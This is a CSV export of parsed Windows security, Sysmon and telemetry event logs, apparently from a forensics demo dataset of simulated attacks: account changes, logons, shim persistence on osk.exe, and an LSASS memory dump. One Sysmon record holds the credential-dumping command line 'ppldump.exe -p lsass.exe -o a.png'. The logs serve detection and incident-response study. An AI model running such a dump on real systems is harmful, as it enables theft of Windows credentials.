54,198239293,2019-03-25 13:01:41.9326101,4738,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3948,DC1.insecurebank.local,0,,A user account was changed,insecurebank\bob,,Target: insecurebank\alice,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: - AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: -,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""Dummy"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""alice""},{""@Name"":""TargetDomainName"",""#text"":""insecurebank""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1107""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3D8E8DB""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""-""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""}]}}"
55,198239294,2019-03-25 13:01:41.9356052,4742,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3948,DC1.insecurebank.local,1,,A computer account was changed,insecurebank\bob,,Target: insecurebank\ALICE$,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: - AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: - DnsHostName: - ServicePrincipalNames: -,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""ComputerAccountChange"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""ALICE$""},{""@Name"":""TargetDomainName"",""#text"":""insecurebank""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1120""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3D8E8DB""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""-""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""},{""@Name"":""DnsHostName"",""#text"":""-""},{""@Name"":""ServicePrincipalNames"",""#text"":""-""}]}}"
1,137222,2020-09-09 13:18:23.6279525,4625,LogAlways,Microsoft-Windows-Security-Auditing,Security,640,684,MSEDGEWIN10,0,,Failed logon,MSEDGEWIN10\IEUser,MSEDGEWIN10 (-),Target: MSEDGEWIN10\IEUser,LogonType 2,FailureReason1: the cause is either a bad username or authentication information,FailureReason2: user name is correct but the password is wrong,,,C:\Program Files (x86)\Google\Chrome\Application\chrome.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/CA_4624_4625_LogonType2_LogonProc_chrome.evtx,Audit failure,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-3461203602-4096304019-2269080069-1000""},{""@Name"":""SubjectUserName"",""#text"":""IEUser""},{""@Name"":""SubjectDomainName"",""#text"":""MSEDGEWIN10""},{""@Name"":""SubjectLogonId"",""#text"":""0x79E59""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""IEUser""},{""@Name"":""TargetDomainName"",""#text"":""MSEDGEWIN10""},{""@Name"":""Status"",""#text"":""0xC000006D""},{""@Name"":""FailureReason"",""#text"":""%%2313""},{""@Name"":""SubStatus"",""#text"":""0xC000006A""},{""@Name"":""LogonType"",""#text"":""2""},{""@Name"":""LogonProcessName"",""#text"":""Chrome""},{""@Name"":""AuthenticationPackageName"",""#text"":""Negotiate""},{""@Name"":""WorkstationName"",""#text"":""MSEDGEWIN10""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x1358""},{""@Name"":""ProcessName"",""#text"":""C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe""},{""@Name"":""IpAddress"",""#text"":""-""},{""@Name"":""IpPort"",""#text"":""-""}]}}"
2,137223,2020-09-09 13:18:25.3771200,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,640,712,MSEDGEWIN10,0,,Successful logon,WORKGROUP\MSEDGEWIN10$,- (-),Target: NT AUTHORITY\SYSTEM,LogonType 5,LogonId: 0x3E7,AuthenticationPackageName: Negotiate,"LogonProcessName: Advapi  ",,C:\Windows\System32\services.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/CA_4624_4625_LogonType2_LogonProc_chrome.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""MSEDGEWIN10$""},{""@Name"":""SubjectDomainName"",""#text"":""WORKGROUP""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""SYSTEM""},{""@Name"":""TargetDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""TargetLogonId"",""#text"":""0x3E7""},{""@Name"":""LogonType"",""#text"":""5""},{""@Name"":""LogonProcessName"",""#text"":""Advapi  ""},{""@Name"":""AuthenticationPackageName"",""#text"":""Negotiate""},{""@Name"":""WorkstationName"",""#text"":""-""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x25C""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""IpAddress"",""#text"":""-""},{""@Name"":""IpPort"",""#text"":""-""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
3,137224,2020-09-09 13:18:27.7146132,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,640,684,MSEDGEWIN10,0,,Successful logon,MSEDGEWIN10\IEUser,MSEDGEWIN10 (-),Target: MSEDGEWIN10\IEUser,LogonType 2,LogonId: 0x1CD8F6,AuthenticationPackageName: Negotiate,LogonProcessName: Chrome,,C:\Program Files (x86)\Google\Chrome\Application\chrome.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/CA_4624_4625_LogonType2_LogonProc_chrome.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-3461203602-4096304019-2269080069-1000""},{""@Name"":""SubjectUserName"",""#text"":""IEUser""},{""@Name"":""SubjectDomainName"",""#text"":""MSEDGEWIN10""},{""@Name"":""SubjectLogonId"",""#text"":""0x79E59""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-3461203602-4096304019-2269080069-1000""},{""@Name"":""TargetUserName"",""#text"":""IEUser""},{""@Name"":""TargetDomainName"",""#text"":""MSEDGEWIN10""},{""@Name"":""TargetLogonId"",""#text"":""0x1CD8F6""},{""@Name"":""LogonType"",""#text"":""2""},{""@Name"":""LogonProcessName"",""#text"":""Chrome""},{""@Name"":""AuthenticationPackageName"",""#text"":""Negotiate""},{""@Name"":""WorkstationName"",""#text"":""MSEDGEWIN10""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x1358""},{""@Name"":""ProcessName"",""#text"":""C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe""},{""@Name"":""IpAddress"",""#text"":""-""},{""@Name"":""IpPort"",""#text"":""-""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x1CD964""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
4,137225,2020-09-09 13:18:27.7147586,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,640,684,MSEDGEWIN10,0,,Successful logon,MSEDGEWIN10\IEUser,MSEDGEWIN10 (-),Target: MSEDGEWIN10\IEUser,LogonType 2,LogonId: 0x1CD964,AuthenticationPackageName: Negotiate,LogonProcessName: Chrome,,C:\Program Files (x86)\Google\Chrome\Application\chrome.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/CA_4624_4625_LogonType2_LogonProc_chrome.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-3461203602-4096304019-2269080069-1000""},{""@Name"":""SubjectUserName"",""#text"":""IEUser""},{""@Name"":""SubjectDomainName"",""#text"":""MSEDGEWIN10""},{""@Name"":""SubjectLogonId"",""#text"":""0x79E59""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-3461203602-4096304019-2269080069-1000""},{""@Name"":""TargetUserName"",""#text"":""IEUser""},{""@Name"":""TargetDomainName"",""#text"":""MSEDGEWIN10""},{""@Name"":""TargetLogonId"",""#text"":""0x1CD964""},{""@Name"":""LogonType"",""#text"":""2""},{""@Name"":""LogonProcessName"",""#text"":""Chrome""},{""@Name"":""AuthenticationPackageName"",""#text"":""Negotiate""},{""@Name"":""WorkstationName"",""#text"":""MSEDGEWIN10""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x1358""},{""@Name"":""ProcessName"",""#text"":""C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe""},{""@Name"":""IpAddress"",""#text"":""-""},{""@Name"":""IpPort"",""#text"":""-""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x1CD8F6""},{""@Name"":""ElevatedToken"",""#text"":""%%1843""}]}}"
1,20012,2020-02-10 10:08:24.5350953,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2728,3456,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 5016, ProcessGUID: 747f3d96-2b98-5e41-0000-00109c904700",RuleName: suspicious execution path,"SHA1=C8BBBB2554D7C1F29B8670A14BE4E52D7AF81A24,MD5=DD7D6D8101A6412ABFA7B55F10E1D31B,SHA256=70908F9BBC59198FEBE0D1CA0E34A9E79C68F5053A39A0BA0C6F6CEC9ED1A875,IMPHASH=0EFF65F1D3AC0A58787724FB03E2D1BC",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 4236, ParentProcessGUID: 747f3d96-27fe-5e41-0000-0010dd653800","ParentCommandLine: ""C:\Windows\system32\cmd.exe"" ",ppldump.exe  -p lsass.exe -o a.png,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""suspicious execution path""},{""@Name"":""UtcTime"",""#text"":""2020-02-10 10:08:24.525""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-2b98-5e41-0000-00109c904700""},{""@Name"":""ProcessId"",""#text"":""5016""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\BYOV\\ZAM64\\ppldump.exe""},{""@Name"":""FileVersion"",""#text"":""?""},{""@Name"":""Description"",""#text"":""?""},{""@Name"":""Product"",""#text"":""?""},{""@Name"":""Company"",""#text"":""?""},{""@Name"":""OriginalFileName"",""#text"":""?""},{""@Name"":""CommandLine"",""#text"":""ppldump.exe  -p lsass.exe -o a.png""},{""@Name"":""CurrentDirectory"",""#text"":""c:\\Users\\Public\\BYOV\\ZAM64\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-21d2-5e41-0000-002034770900""},{""@Name"":""LogonId"",""#text"":""0x97734""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA1=C8BBBB2554D7C1F29B8670A14BE4E52D7AF81A24,MD5=DD7D6D8101A6412ABFA7B55F10E1D31B,SHA256=70908F9BBC59198FEBE0D1CA0E34A9E79C68F5053A39A0BA0C6F6CEC9ED1A875,IMPHASH=0EFF65F1D3AC0A58787724FB03E2D1BC""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-27fe-5e41-0000-0010dd653800""},{""@Name"":""ParentProcessId"",""#text"":""4236""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\system32\\cmd.exe\"" ""}]}}"
2,20013,2020-02-10 10:08:24.6664898,10,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2728,3456,MSEDGEWIN10,0,S-1-5-18,ProcessAccess,"SourceUser:  | TargetUser: ",,,GrantedAccess: Unknown code (0x1FFFFF),"SourceProcessID: 5016, SourceProcessGUID: ",SourceImage: c:\Users\Public\BYOV\ZAM64\ppldump.exe,"TargetProcessID: 624, TargetProcessGUID: ",TargetImage: C:\Windows\system32\lsass.exe,CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9f844|C:\Windows\System32\KERNELBASE.dll+1ef87|C:\Windows\System32\KERNEL32.DLL+15310|c:\Users\Public\BYOV\ZAM64\ppldump.exe+1b0c|c:\Users\Public\BYOV\ZAM64\ppldump.exe+1844|c:\Users\Public\BYOV\ZAM64\ppldump.exe+13a5|c:\Users\Public\BYOV\ZAM64\ppldump.exe+150b|C:\Windows\System32\KERNEL32.DLL+17974|C:\Windows\SYSTEM32\ntdll.dll+6a271,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-02-10 10:08:24.652""},{""@Name"":""SourceProcessGUID"",""#text"":""747f3d96-2b98-5e41-0000-00109c904700""},{""@Name"":""SourceProcessId"",""#text"":""5016""},{""@Name"":""SourceThreadId"",""#text"":""8364""},{""@Name"":""SourceImage"",""#text"":""c:\\Users\\Public\\BYOV\\ZAM64\\ppldump.exe""},{""@Name"":""TargetProcessGUID"",""#text"":""747f3d96-a042-5e41-0000-0010e4560000""},{""@Name"":""TargetProcessId"",""#text"":""624""},{""@Name"":""TargetImage"",""#text"":""C:\\Windows\\system32\\lsass.exe""},{""@Name"":""GrantedAccess"",""#text"":""0x1FFFFF""},{""@Name"":""CallTrace"",""#text"":""C:\\Windows\\SYSTEM32\\ntdll.dll+9f844|C:\\Windows\\System32\\KERNELBASE.dll+1ef87|C:\\Windows\\System32\\KERNEL32.DLL+15310|c:\\Users\\Public\\BYOV\\ZAM64\\ppldump.exe+1b0c|c:\\Users\\Public\\BYOV\\ZAM64\\ppldump.exe+1844|c:\\Users\\Public\\BYOV\\ZAM64\\ppldump.exe+13a5|c:\\Users\\Public\\BYOV\\ZAM64\\ppldump.exe+150b|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271""}]}}"
3,20014,2020-02-10 10:08:25.1644270,7,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2728,3460,MSEDGEWIN10,0,S-1-5-18,Image loaded,,,"ProcessID: 624, ProcessGUID: 747f3d96-a042-5e41-0000-0010e4560000",RuleName: Suspicious ImageLoad - Possible Memdump,"SHA1=E3FA87C983008D4D2A5D31708415F88548FC7702,MD5=88E88D8C1C663769BDD722000A7EB5A7,SHA256=C84BECA73EA45D3C53D9C42CD6A37CC0CC07FF57D9CFEE113CDF70F640572AEF,IMPHASH=9D75F08EA29885182B136CE4FF854114",Signed: true,Image: C:\Windows\System32\lsass.exe,,C:\Windows\System32\dbgcore.dll,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Suspicious ImageLoad - Possible Memdump""},{""@Name"":""UtcTime"",""#text"":""2020-02-10 10:08:24.667""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-a042-5e41-0000-0010e4560000""},{""@Name"":""ProcessId"",""#text"":""624""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\lsass.exe""},{""@Name"":""ImageLoaded"",""#text"":""C:\\Windows\\System32\\dbgcore.dll""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Core Debugging Helpers""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""DBGCORE.DLL""},{""@Name"":""Hashes"",""#text"":""SHA1=E3FA87C983008D4D2A5D31708415F88548FC7702,MD5=88E88D8C1C663769BDD722000A7EB5A7,SHA256=C84BECA73EA45D3C53D9C42CD6A37CC0CC07FF57D9CFEE113CDF70F640572AEF,IMPHASH=9D75F08EA29885182B136CE4FF854114""},{""@Name"":""Signed"",""#text"":""true""},{""@Name"":""Signature"",""#text"":""Microsoft Windows""},{""@Name"":""SignatureStatus"",""#text"":""Valid""}]}}"
4,20015,2020-02-10 10:08:25.1932646,7,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2728,3460,MSEDGEWIN10,0,S-1-5-18,Image loaded,,,"ProcessID: 624, ProcessGUID: 747f3d96-a042-5e41-0000-0010e4560000",RuleName: Suspicious ImageLoad - Possible Memdump,"SHA1=8B5BC2EAA00C530DF0FF139635E428FA4C5D7AA8,MD5=B0A68C5BB8D5493F1AF967F0FDD80382,SHA256=2CF0972DC8A67D863AD1A6205B66C80865ACC11F7E3F67B4A76C162655EE0FEE,IMPHASH=AB902346D2BD8706EE70C87E00136BAC",Signed: true,Image: C:\Windows\System32\lsass.exe,,C:\Windows\System32\dbghelp.dll,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Suspicious ImageLoad - Possible Memdump""},{""@Name"":""UtcTime"",""#text"":""2020-02-10 10:08:25.027""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-a042-5e41-0000-0010e4560000""},{""@Name"":""ProcessId"",""#text"":""624""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\lsass.exe""},{""@Name"":""ImageLoaded"",""#text"":""C:\\Windows\\System32\\dbghelp.dll""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Image Helper""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""DBGHELP.DLL""},{""@Name"":""Hashes"",""#text"":""SHA1=8B5BC2EAA00C530DF0FF139635E428FA4C5D7AA8,MD5=B0A68C5BB8D5493F1AF967F0FDD80382,SHA256=2CF0972DC8A67D863AD1A6205B66C80865ACC11F7E3F67B4A76C162655EE0FEE,IMPHASH=AB902346D2BD8706EE70C87E00136BAC""},{""@Name"":""Signed"",""#text"":""true""},{""@Name"":""Signature"",""#text"":""Microsoft Windows""},{""@Name"":""SignatureStatus"",""#text"":""Valid""}]}}"
5,20016,2020-02-10 10:08:25.1937759,7,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2728,3460,MSEDGEWIN10,0,S-1-5-18,Image loaded,,,"ProcessID: 624, ProcessGUID: 747f3d96-a042-5e41-0000-0010e4560000",RuleName: Suspicious ImageLoad - Possible Memdump,"SHA1=8B5BC2EAA00C530DF0FF139635E428FA4C5D7AA8,MD5=B0A68C5BB8D5493F1AF967F0FDD80382,SHA256=2CF0972DC8A67D863AD1A6205B66C80865ACC11F7E3F67B4A76C162655EE0FEE,IMPHASH=AB902346D2BD8706EE70C87E00136BAC",Signed: true,Image: C:\Windows\System32\lsass.exe,,C:\Windows\System32\dbghelp.dll,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Suspicious ImageLoad - Possible Memdump""},{""@Name"":""UtcTime"",""#text"":""2020-02-10 10:08:24.667""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-a042-5e41-0000-0010e4560000""},{""@Name"":""ProcessId"",""#text"":""624""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\lsass.exe""},{""@Name"":""ImageLoaded"",""#text"":""C:\\Windows\\System32\\dbghelp.dll""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Image Helper""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""DBGHELP.DLL""},{""@Name"":""Hashes"",""#text"":""SHA1=8B5BC2EAA00C530DF0FF139635E428FA4C5D7AA8,MD5=B0A68C5BB8D5493F1AF967F0FDD80382,SHA256=2CF0972DC8A67D863AD1A6205B66C80865ACC11F7E3F67B4A76C162655EE0FEE,IMPHASH=AB902346D2BD8706EE70C87E00136BAC""},{""@Name"":""Signed"",""#text"":""true""},{""@Name"":""Signature"",""#text"":""Microsoft Windows""},{""@Name"":""SignatureStatus"",""#text"":""Valid""}]}}"
6,20017,2020-02-10 10:08:27.7973982,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2728,3456,MSEDGEWIN10,0,S-1-5-18,Process terminated,,,"ProcessID: 5016, ProcessGUID: 747f3d96-2b98-5e41-0000-00109c904700",,,,,,C:\Users\Public\BYOV\ZAM64\ppldump.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-02-10 10:08:27.779""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-2b98-5e41-0000-00109c904700""},{""@Name"":""ProcessId"",""#text"":""5016""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\BYOV\\ZAM64\\ppldump.exe""}]}}"
1,21,2019-03-19 17:06:22.9381297,500,Info,Microsoft-Windows-Application-Experience,Microsoft-Windows-Application-Experience/Program-Telemetry,3936,2156,PC01.example.corp,0,S-1-5-21-1587066498-1489273250-1035260531-1106,Application Experience Program Telemetry,,,ProcessId: 3936,StartTime: 2019-03-19 17:06:22.9080865,,,,,C:\Windows\System32\osk.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Persistence_Shime_Microsoft-Windows-Application-Experience_Program-Telemetry_500.evtx,0x1000000000000000,0,"{""UserData"":{""CompatibilityFixEvent"":{""ProcessId"":""3936"",""StartTime"":""2019-03-19 17:06:22.9080865"",""FixID"":""8a23a24a-9a8d-44b6-a6d4-556c53a289b5"",""Flags"":""0x10205"",""ExePath"":""C:\\Windows\\System32\\osk.exe"",""FixName"":""CorrectFilePaths""}}}"
2,22,2019-03-19 20:48:33.4696256,500,Info,Microsoft-Windows-Application-Experience,Microsoft-Windows-Application-Experience/Program-Telemetry,3724,1212,PC01.example.corp,0,S-1-5-21-1587066498-1489273250-1035260531-1106,Application Experience Program Telemetry,,,ProcessId: 3724,StartTime: 2019-03-19 20:48:33.4095392,,,,,C:\Windows\System32\osk.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Persistence_Shime_Microsoft-Windows-Application-Experience_Program-Telemetry_500.evtx,0x1000000000000000,0,"{""UserData"":{""CompatibilityFixEvent"":{""ProcessId"":""3724"",""StartTime"":""2019-03-19 20:48:33.4095392"",""FixID"":""8a23a24a-9a8d-44b6-a6d4-556c53a289b5"",""Flags"":""0x10205"",""ExePath"":""C:\\Windows\\System32\\osk.exe"",""FixName"":""CorrectFilePaths""}}}"
3,23,2019-03-19 20:49:27.8778608,500,Info,Microsoft-Windows-Application-Experience,Microsoft-Windows-Application-Experience/Program-Telemetry,3916,3912,PC01.example.corp,0,S-1-5-21-1587066498-1489273250-1035260531-1106,Application Experience Program Telemetry,,,ProcessId: 3916,StartTime: 2019-03-19 20:49:27.8277888,,,,,C:\Windows\System32\osk.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Persistence_Shime_Microsoft-Windows-Application-Experience_Program-Telemetry_500.evtx,0x1000000000000000,0,"{""UserData"":{""CompatibilityFixEvent"":{""ProcessId"":""3916"",""StartTime"":""2019-03-19 20:49:27.8277888"",""FixID"":""8a23a24a-9a8d-44b6-a6d4-556c53a289b5"",""Flags"":""0x10205"",""ExePath"":""C:\\Windows\\System32\\osk.exe"",""FixName"":""CorrectFilePaths""}}}"
4,24,2019-03-19 20:49:44.8823120,500,Info,Microsoft-Windows-Application-Experience,Microsoft-Windows-Application-Experience/Program-Telemetry,2668,3976,PC01.example.corp,0,S-1-5-21-1587066498-1489273250-1035260531-1106,Application Experience Program Telemetry,,,ProcessId: 2668,StartTime: 2019-03-19 20:49:44.8522688,,,,,C:\Windows\System32\osk.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Persistence_Shime_Microsoft-Windows-Application-Experience_Program-Telemetry_500.evtx,0x1000000000000000,0,"{""UserData"":{""CompatibilityFixEvent"":{""ProcessId"":""2668"",""StartTime"":""2019-03-19 20:49:44.8522688"",""FixID"":""8a23a24a-9a8d-44b6-a6d4-556c53a289b5"",""Flags"":""0x10205"",""ExePath"":""C:\\Windows\\System32\\osk.exe"",""FixName"":""CorrectFilePaths""}}}"
